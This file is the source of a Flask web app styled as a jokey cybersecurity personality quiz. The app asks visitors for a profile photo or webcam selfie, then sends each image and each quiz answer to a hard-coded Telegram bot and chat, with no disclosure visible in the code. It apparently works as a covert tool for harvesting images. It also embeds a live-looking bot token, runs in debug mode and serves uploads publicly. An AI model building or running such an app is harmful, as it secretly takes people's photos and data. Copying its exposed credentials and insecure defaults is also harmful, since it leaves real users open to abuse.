import os
import logging
from flask import Flask, render_template, request, redirect, url_for, flash, send_from_directory
from werkzeug.utils import secure_filename
import requests
from io import BytesIO
from PIL import Image
import base64
import uuid

app = Flask(__name__)
app.secret_key = 'your-secret-key-here'  # Change this in production

# Configuration
UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
TELEGRAM_BOT_TOKEN = '7463154656:AAHgFEsHimLYz6gBKKrJyiL8vcci6QLZVTY'
TELEGRAM_CHAT_ID = '7411249799'

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# Questions setup
questions = [
    {
        'id': 1,
        'text': "What's the most secure password you've ever used?",
        'options': [
            "123456 (It's easy to remember)",
            "password (Classic is best)",
            "My pet's name + birth year (Personal touch)",
            "A 24-character random string (Maximum security)"
        ]
    },
    {
        'id': 2,
        'text': "If you were a hacker, what would be your signature move?",
        'options': [
            "Phishing with cat memes",
            "Social engineering with bad puns",
            "Brute force while playing heavy metal",
            "SQL injection with emoji payloads"
        ]
    },
    {
        'id': 3,
        'text': "What's your ideal cybersecurity superpower?",
        'options': [
            "X-ray vision for firewalls",
            "Teleportation through VPNs",
            "Mind reading for encryption keys",
            "Invisibility in network traffic"
        ]
    },
    {
        'id': 4,
        'text': "How do you react to a security breach?",
        'options': [
            "Panic and unplug everything",
            "Blame the intern",
            "Start a post-mortem with memes",
            "Deploy the blockchain"
        ]
    },
    {
        'id': 5,
        'text': "What's your spirit animal in cybersecurity?",
        'options': [
            "Honey badger (Doesn't care about firewalls)",
            "Octopus (Multiple attack vectors)",
            "Chameleon (Perfect OPSEC)",
            "Phoenix (Always recovers from breaches)"
        ]
    }
]

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def send_to_telegram(text, image_path=None):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        logging.warning("Telegram credentials not configured")
        return False
    
    try:
        if image_path:
            with open(image_path, 'rb') as image_file:
                files = {'photo': image_file}
                data = {
                    'chat_id': TELEGRAM_CHAT_ID,
                    'caption': text
                }
                response = requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto",
                    files=files,
                    data=data
                )
        else:
            data = {
                'chat_id': TELEGRAM_CHAT_ID,
                'text': text
            }
            response = requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                data=data
            )
        return response.status_code == 200
    except Exception as e:
        logging.error(f"Error sending to Telegram: {e}")
        return False

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_quiz', methods=['POST'])
def start_quiz():
    session_id = str(uuid.uuid4())
    return redirect(url_for('profile_picture', session_id=session_id))

@app.route('/profile_picture/<session_id>')
def profile_picture(session_id):
    return render_template('profile_picture.html', session_id=session_id)

@app.route('/upload_picture/<session_id>', methods=['POST'])
def upload_picture(session_id):
    if 'file' not in request.files:
        flash('No file part')
        return redirect(url_for('profile_picture', session_id=session_id))
    
    file = request.files['file']
    if file.filename == '':
        flash('No selected file')
        return redirect(url_for('profile_picture', session_id=session_id))
    
    if file and allowed_file(file.filename):
        filename = secure_filename(f"{session_id}_{file.filename}")
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        
        # Send to Telegram
        send_to_telegram(f"New profile picture from session {session_id}", filepath)
        
        return redirect(url_for('question', session_id=session_id, question_id=1))
    
    flash('Invalid file type')
    return redirect(url_for('profile_picture', session_id=session_id))

@app.route('/use_camera/<session_id>')
def use_camera(session_id):
    return render_template('camera.html', session_id=session_id)

@app.route('/upload_camera/<session_id>', methods=['POST'])
def upload_camera(session_id):
    image_data = request.form.get('image_data')
    if not image_data:
        flash('No image data received')
        return redirect(url_for('profile_picture', session_id=session_id))
    
    try:
        # Remove the header from the base64 string
        header, encoded = image_data.split(",", 1)
        binary_data = base64.b64decode(encoded)
        
        # Convert to image and save
        image = Image.open(BytesIO(binary_data))
        filename = f"{session_id}_selfie.jpg"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        image.save(filepath, "JPEG")
        
        # Send to Telegram
        send_to_telegram(f"New selfie from session {session_id}", filepath)
        
        return redirect(url_for('question', session_id=session_id, question_id=1))
    except Exception as e:
        flash('Error processing image')
        logging.error(f"Error processing camera image: {e}")
        return redirect(url_for('profile_picture', session_id=session_id))

@app.route('/question/<session_id>/<int:question_id>')
def question(session_id, question_id):
    if question_id < 1 or question_id > len(questions):
        return redirect(url_for('results', session_id=session_id))
    
    current_question = questions[question_id - 1]
    return render_template('question.html', 
                         session_id=session_id,
                         question=current_question,
                         question_id=question_id,
                         total_questions=len(questions))

@app.route('/submit_answer/<session_id>/<int:question_id>', methods=['POST'])
def submit_answer(session_id, question_id):
    answer = request.form.get('answer')
    if not answer:
        flash('Please select an answer')
        return redirect(url_for('question', session_id=session_id, question_id=question_id))
    
    # Store the answer (in a real app, you'd use a database)
    # For now, we'll just send to Telegram immediately
    current_question = questions[question_id - 1]
    response_text = f"Session {session_id}\nQ{question_id}: {current_question['text']}\nA: {answer}"
    send_to_telegram(response_text)
    
    # Move to next question or results
    next_question_id = question_id + 1
    if next_question_id > len(questions):
        return redirect(url_for('results', session_id=session_id))
    else:
        return redirect(url_for('question', session_id=session_id, question_id=next_question_id))

@app.route('/results/<session_id>')
def results(session_id):
    # In a real app, you'd retrieve and display all answers from storage
    return render_template('results.html', session_id=session_id)

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

if __name__ == '__main__':
    app.run(debug=True)
